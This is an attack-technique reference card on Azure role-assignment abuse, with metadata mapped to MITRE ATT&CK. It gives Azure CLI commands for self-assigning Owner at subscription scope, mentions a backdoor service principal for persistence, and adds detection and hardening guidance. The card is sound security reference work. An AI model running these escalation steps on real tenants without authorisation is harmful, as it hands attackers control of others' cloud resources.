# [PE-VALID-010]: Azure Role Assignment Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-010 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** In Azure RBAC, the permission `Microsoft.Authorization/roleAssignments/write` allows a principal to grant permissions to others *or themselves*. Several built-in roles have this: `Owner`, `User Access Administrator`, and `Role Based Access Control Administrator`. If an attacker compromises a Service Principal or User with this permission (even scoped to a specific Resource Group), they can elevate themselves to `Owner` of that scope, or assign permissions to other compromised identities to persist.
- **Attack Surface:** Azure RBAC Permissions.
- **Business Impact:** **Vertical Privilege Escalation**. From "User Access Admin" to "Data Owner".

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** `Microsoft.Authorization/roleAssignments/write` on a scope.
- **Tools:**
    - Azure CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Permissions**
```bash
az role assignment list --assignee <MyID>
# Look for roleAssignments/write action
```

**Step 2: Self-Escalate**
Assign "Owner" to the current user.
```bash
az role assignment create --assignee <MyID> --role "Owner" --scope "/subscriptions/<SubID>"
```

**Step 3: Persist**
Assign a backdoor Service Principal as "Contributor".

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Activity Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Administrative** | `Write RoleAssignment` | A user assigning a role to *themselves* or creating an assignment for `Owner`/`User Access Administrator` (High Privilege). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Conditions:** Use **Attribute-Based Access Control (ABAC)** conditions on role assignments to restrict *who* can be assigned roles (e.g., "Can only assign Reader role").
*   **PIM:** Enforce PIM for all privileged roles (`Owner`, `User Access Administrator`).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [CA-UNSC-007]
